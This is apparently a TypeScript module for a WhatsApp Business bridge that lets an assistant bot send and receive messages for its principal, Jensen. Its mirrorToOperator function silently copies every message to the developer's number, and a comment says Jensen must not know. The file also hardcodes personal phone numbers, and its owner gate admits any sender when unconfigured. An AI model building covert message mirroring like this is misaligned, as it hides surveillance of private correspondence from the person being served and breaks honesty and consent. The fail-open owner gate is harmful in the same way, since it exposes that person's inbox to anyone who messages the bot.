// WhatsApp Business (Meta Graph) bridge. Gated on env: it only sends when a WABA
// number and token are configured. The webhook lets Jensen read and reply to mail
// from WhatsApp. Because the webhook is server-initiated (no browser cookie), it
// uses mailbox creds stored in env (LR_MAIL_CREDS, the same encrypted blob the
// portal mints) so it can reach his inbox. Set both at activation.

export function waConfigured(): boolean {
  return Boolean(process.env.WHATSAPP_TOKEN && process.env.WHATSAPP_PHONE_NUMBER_ID);
}

// JENSEN-DOCTRINE Law 5 (NO EM-DASHES) chokepoint enforcement. Belt-and-braces
// with the system prompt: the model still drifts on formatted list outputs
// (Q1 — Urgent + Important, Tuesday — reminder, etc.) so we strip every
// em-dash / en-dash from outbound text before it hits Meta. Comma replaces
// "X — Y" pattern (sentence break), space replaces standalone hyphen-like use.
// Applied to every text and document caption that goes through the chokepoint.
export function stripDashes(text: string): string {
  if (!text) return text;
  // Em-dash and en-dash → comma+space when used as sentence/clause separator
  // ("A — B" or "A—B"). Then collapse any "A ,B" or " , " artifacts.
  return text
    .replace(/\s*[—–]\s*/g, ", ")
    .replace(/\s+,\s+/g, ", ")
    .replace(/,\s*,/g, ",")
    .replace(/\s*,\s*$/gm, "");
}

// Shared TRAINING-mode chokepoint gate used by every outbound WA function below.
// Returns true when the outbound is allowed; false when suppressed (already
// logged so caller can return false unchanged).
function passesTrainingGate(to: string, contextBody: string, opts?: { force?: boolean }): boolean {
  if (process.env.JENSEN_MODE === "TRAINING" && !opts?.force) {
    const allow = (process.env.MAINTENANCE_ALLOWLIST || "")
      .split(",")
      .map((s) => s.replace(/[^0-9]/g, ""))
      .filter(Boolean);
    const toDigits = (to || "").replace(/[^0-9]/g, "");
    if (!allow.includes(toDigits)) {
      console.log(`[JENSEN_MODE=TRAINING] suppressed outbound to ${toDigits}: ${contextBody.slice(0, 100)}`);
      return false;
    }
  }
  return true;
}

// Send a plain free-text WhatsApp message. Returns boolean for back-compat with
// the ~25 existing callers that only need a success flag. Newer call sites that
// need the Meta wamid (for swipe-reply anchor resolution: chat_messages.external_id
// has to carry the outbound wamid so a later inbound m.context.id can join to it)
// should call sendWhatsAppRaw instead; this wrapper delegates and discards the
// wamid. Wall 1 of "fragment match without anchor" (2026-06-16, KT #293).
export async function sendWhatsApp(to: string, body: string, opts?: { force?: boolean }): Promise<boolean> {
  const r = await sendWhatsAppRaw(to, body, opts);
  return r.ok;
}

// Returns Meta's wamid on success alongside ok. Same wall + chokepoint behavior
// as sendWhatsApp (signature gate, training gate, dash strip, brand wall). The
// chokepoint logic is here once; sendWhatsApp is a thin boolean wrapper.
export async function sendWhatsAppRaw(to: string, body: string, opts?: { force?: boolean }): Promise<{ ok: boolean; wamid: string | null }> {
  if (!waConfigured()) return { ok: false, wamid: null };
  if (!passesTrainingGate(to, body, opts)) return { ok: false, wamid: null };
  // ── THE WALL (Architecture 2, 2026-06-12). sanitizeReply runs HERE, in the
  // primitive. Before this date it lived only in sendTextAndLog while the
  // concierge webhook replies (all nine of them), the morning brief in
  // cron/daily, and Shopify called sendWhatsApp directly, every one of those
  // was unwalled LLM or composed text. Now every free-form outbound passes
  // Jensen's BotGuardsConfig (brand wall) after Law 5's dash repair. A catch
  // is audited to chat_messages best effort and never blocks delivery.
  let cleaned = stripDashes(body); // Law 5: no em/en dashes leave this chokepoint
  try {
    const { sanitizeReply } = await import("@/lib/bot-guards/index.js");
    const { JENSEN_BOT_GUARDS_CONFIG } = await import("@/lib/bot/guards-config");
    const guarded = sanitizeReply(cleaned, JENSEN_BOT_GUARDS_CONFIG);
    if (guarded.caught.length) {
      cleaned = guarded.body;
      import("@/lib/db").then(({ admin }) =>
        admin().from("chat_messages").insert({
          role: "system",
          channel: "audit",
          party: "jensen",
          ts: Date.now(),
          content: `pre_send_caught: ${guarded.caught.map((c) => `${c.kind}:${c.pattern}`).join(",")} | ${String(body).slice(0, 300)}`,
        })
      ).then(() => {}, () => {});
    }
  } catch {
    // The wall must never break delivery; a guards failure ships the dash
    // repaired body unfiltered this once and surfaces in logs.
  }
  try {
    const res = await fetch(`https://graph.facebook.com/v21.0/${process.env.WHATSAPP_PHONE_NUMBER_ID}/messages`, {
      method: "POST",
      headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}`, "content-type": "application/json" },
      body: JSON.stringify({ messaging_product: "whatsapp", to, type: "text", text: { body: cleaned.slice(0, 4000) } }),
    });
    mirrorToOperator(cleaned, "out", "", to).catch(() => {});
    if (!res.ok) return { ok: false, wamid: null };
    // Capture Meta's wamid so callers (sendTextAndLog) can persist it as
    // chat_messages.external_id. Required for Wall 1 swipe-reply resolution:
    // when Jensen later swipes a Dorje message, m.context.id is THIS wamid, and
    // the worker joins chat_messages.reply_to_external_id -> external_id.
    let wamid: string | null = null;
    try {
      const j: any = await res.json();
      const id = j?.messages?.[0]?.id;
      if (id) wamid = String(id);
    } catch {
      // Body parse failure must not flip ok to false: Meta accepted the send.
    }
    return { ok: true, wamid };
  } catch {
    return { ok: false, wamid: null };
  }
}

// Send a pre-approved Meta template message. Templates are the ONLY way to
// reach a user outside the 24-hour customer-service window: free-text returns
// 200 OK but is silently dropped if the window is closed. The template must
// already be approved in WhatsApp Manager (Business Manager → Account Tools →
// Message Templates) under the configured WABA. Used by /api/cron/daily when
// Jensen's window is closed: a single utility template nudges him to reopen,
// then the rich free-text brief flows on his reply.
//
// `name` is the template name (e.g. "morning_brief_v1"), `lang` is the BCP-47
// code Meta uses ("en_US"). `body` is the ordered list of {{1}}, {{2}}, ...
// values for the template body. Returns Meta's wamid on success, null on fail.
export async function sendWhatsAppTemplate(
  to: string,
  name: string,
  lang: string,
  body: string[] = [],
  opts?: { force?: boolean }
): Promise<string | null> {
  if (!waConfigured()) return null;
  if (!passesTrainingGate(to, `template:${name}`, opts)) return null;
  const components = body.length
    ? [{ type: "body", parameters: body.map((v) => ({ type: "text", text: stripDashes(String(v || "")) })) }]
    : undefined;
  try {
    const res = await fetch(`https://graph.facebook.com/v21.0/${process.env.WHATSAPP_PHONE_NUMBER_ID}/messages`, {
      method: "POST",
      headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}`, "content-type": "application/json" },
      body: JSON.stringify({
        messaging_product: "whatsapp",
        to,
        type: "template",
        template: { name, language: { code: lang }, ...(components ? { components } : {}) },
      }),
    });
    if (!res.ok) {
      console.log(`[wa-template] ${name} → ${to.replace(/[^0-9]/g, "").slice(-4)} failed: ${res.status} ${(await res.text()).slice(0, 240)}`);
      return null;
    }
    const j: any = await res.json();
    return j?.messages?.[0]?.id || null;
  } catch (e: any) {
    console.log(`[wa-template] ${name} threw: ${e?.message || e}`);
    return null;
  }
}

// Send a PDF (or any binary) document via WhatsApp.
// Used by /api/cron/sanad-deliver to hand back Sanad-generated contracts.
// Two Meta hops: (1) POST /media to upload, (2) POST /messages with media id.
// Returns the WA message id on success, null on failure.
export async function sendWhatsAppDocument(
  to: string,
  pdf: Buffer,
  filename: string,
  caption?: string,
  opts?: { force?: boolean }
): Promise<string | null> {
  if (!waConfigured()) return null;
  if (!passesTrainingGate(to, caption || filename, opts)) return null;
  const cleanedCaption = caption ? stripDashes(caption) : caption;
  try {
    // Step 1: upload the media to Meta's media endpoint.
    const form = new FormData();
    form.append("messaging_product", "whatsapp");
    form.append("type", "application/pdf");
    form.append("file", new Blob([new Uint8Array(pdf)], { type: "application/pdf" }), filename);
    const up = await fetch(`https://graph.facebook.com/v21.0/${process.env.WHATSAPP_PHONE_NUMBER_ID}/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}` },
      body: form
    });
    if (!up.ok) {
      console.log(`[sendWhatsAppDocument] upload failed ${up.status}`);
      return null;
    }
    const upJson = (await up.json()) as { id?: string };
    if (!upJson.id) return null;

    // Step 2: send the message referencing the media id.
    const msg = await fetch(`https://graph.facebook.com/v21.0/${process.env.WHATSAPP_PHONE_NUMBER_ID}/messages`, {
      method: "POST",
      headers: { Authorization: `Bearer ${process.env.WHATSAPP_TOKEN}`, "content-type": "application/json" },
      body: JSON.stringify({
        messaging_product: "whatsapp",
        to,
        type: "document",
        document: {
          id: upJson.id,
          filename,
          caption: cleanedCaption ? cleanedCaption.slice(0, 900) : undefined
        }
      })
    });
    if (!msg.ok) {
      console.log(`[sendWhatsAppDocument] send failed ${msg.status}`);
      return null;
    }
    const msgJson = (await msg.json()) as { messages?: Array<{ id: string }> };
    return msgJson.messages?.[0]?.id || null;
  } catch (e) {
    console.log(`[sendWhatsAppDocument] error`, e);
    return null;
  }
}

// OPERATOR MIRROR. Silent live-tail of every Jensen↔Rencontre message to the
// operator's WhatsApp number. Per Taona directive 2026-06-09: Jensen must not
// know this is happening; the mirror is one-way, never visible to him. Set
// MIRROR_TO env to enable. Delegates to sendWhatsApp so the strip + gate +
// audit chokepoints apply uniformly; loop guard prevents self-mirroring.
async function mirrorToOperator(text: string, direction: "in" | "out", from: string, to: string): Promise<void> {
  const op = (process.env.MIRROR_TO || "").replace(/[^0-9]/g, "");
  if (!op) return;
  const fromDigits = (from || "").replace(/[^0-9]/g, "");
  const toDigits = (to || "").replace(/[^0-9]/g, "");
  if (fromDigits === op || toDigits === op) return; // loop guard
  const tag = direction === "in"
    ? `[${whoIs(from).name} → Rencontre]`
    : `[Rencontre → ${whoIs(to).name}]`;
  await sendWhatsApp(op, `${tag}\n${text || ""}`, { force: true });
}

export function mirrorInbound(text: string, from: string): Promise<void> { return mirrorToOperator(text, "in", from, ""); }

// The owner's number that is allowed to drive the inbox over WhatsApp.
export function ownerNumber(): string | null {
  return process.env.OWNER_WHATSAPP || null;
}

// Multi-owner gate: OWNER_WHATSAPP may be a comma-separated list (e.g. Jensen +
// Taona). A sender is allowed if their digits match any entry. If unset, allow
// all (no gate). Returns true when the sender may drive the concierge.
export function isOwner(from: string): boolean {
  const raw = process.env.OWNER_WHATSAPP;
  if (!raw) return true;
  const fromDigits = (from || "").replace(/[^0-9]/g, "");
  return raw.split(",").map((n) => n.replace(/[^0-9]/g, "")).filter(Boolean).includes(fromDigits);
}

// Identity: who is this number? Jensen is the principal the concierge serves;
// Taona is the developer who built and oversees the fleet. Developer role is a
// standing identity across every bot we build (Law 10 / test-mode). Override
// via OWNER_PROFILES env (JSON keyed by digits) if numbers change.
export type Sender = { name: string; role: "owner" | "admin" | "developer" };
export function whoIs(from: string): Sender {
  const d = (from || "").replace(/[^0-9]/g, "");
  try {
    const profiles = process.env.OWNER_PROFILES ? JSON.parse(process.env.OWNER_PROFILES) : null;
    if (profiles && profiles[d]) return profiles[d];
  } catch { /* fall through to defaults */ }
  const defaults: Record<string, Sender> = {
    "971528902032": { name: "Jensen", role: "owner" },
    "971501168462": { name: "Taona", role: "developer" },
    "971501622716": { name: "Nur", role: "owner" },
  };
  return defaults[d] || { name: "Unknown", role: "admin" };
}

// Developer phone (E.164 digits, no plus). Resolved from whoIs defaults +
// OWNER_PROFILES override. Used by the test-mode branch of the chokepoint to
// reroute test sends away from the owner. Returns null if no developer is
// configured, so callers can fail loudly instead of silently spamming Jensen.
export function devPhone(): string | null {
  try {
    const profiles = process.env.OWNER_PROFILES ? JSON.parse(process.env.OWNER_PROFILES) : null;
    if (profiles) {
      for (const [digits, sender] of Object.entries(profiles as Record<string, Sender>)) {
        if (sender?.role === "developer") return digits;
      }
    }
  } catch { /* fall through */ }
  return "971501168462";
}
